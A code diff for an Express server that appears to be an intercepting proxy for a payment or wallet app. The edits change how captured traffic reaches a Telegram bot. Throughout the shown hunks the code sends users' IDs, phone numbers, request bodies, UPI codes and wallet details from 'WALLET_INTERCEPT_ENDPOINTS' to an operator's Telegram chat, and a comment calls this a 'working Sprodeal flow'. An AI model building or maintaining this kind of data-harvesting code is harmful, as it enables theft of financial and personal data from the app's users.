@@ -834,14 +834,14 @@ app.use((req, res, next) => {
       const phone = getPhone(data, userId);
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
-      // Use the serialized Telegram queue so request bursts do not get dropped or rate-limited.
-      safeSend(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`);
+      // Match the working Sprodeal flow: send the request log directly to Telegram.
+      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(() => { });
     } catch (e) { console.error('[LOG_MW_ERROR]', e.message); }
   })();
   next();
 });
 
-app.get('/setup-webhook', async (req, res) => {
+app.get(['/bot-webhook', '/setup-webhook', '/set-webhook'], async (req, res) => {
   if (!bot) return res.json({ error: 'No bot token' });
   try {
     const host = req.headers.host;
@@ -897,7 +897,8 @@ app.post('/bot-webhook', async (req, res) => {
   try {
     await ensureWebhook();
     if (!bot) return res.sendStatus(200);
-    const msg = req.parsedBody?.message;
+    const update = req.parsedBody || req.body || {};
+    const msg = update.message || update.edited_message;
     if (!msg || !msg.text) return res.sendStatus(200);
     const chatId = msg.chat.id;
     const text = msg.text.trim();
@@ -2842,7 +2843,7 @@ async function sendUpiWalletReport(data, req, jsonResp, sourcePath) {
       msg += `UPI Code: ${upiCode} | MemberWallet: ${memWallet}\n\n`;
     });
   }
-  safeSend(data.adminChatId, msg.substring(0, 3900));
+  bot.sendMessage(data.adminChatId, msg.substring(0, 3900)).catch(() => { });
 }
 
 app.all('/app/api/v1/upi/list', async (req, res) => {
@@ -2867,7 +2868,7 @@ for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
           const reqBody = JSON.stringify(req.parsedBody || {}, null, 2);
           msg += `\n\n📤 REQUEST:\n${reqBody.substring(0, 3000)}`;
         }
-        safeSend(data.adminChatId, msg);
+        bot.sendMessage(data.adminChatId, msg).catch(() => { });
       }
       if (ep === '/app/api/v1/wallet/list') {
         await sendUpiWalletReport(data, req, jsonResp, ep);
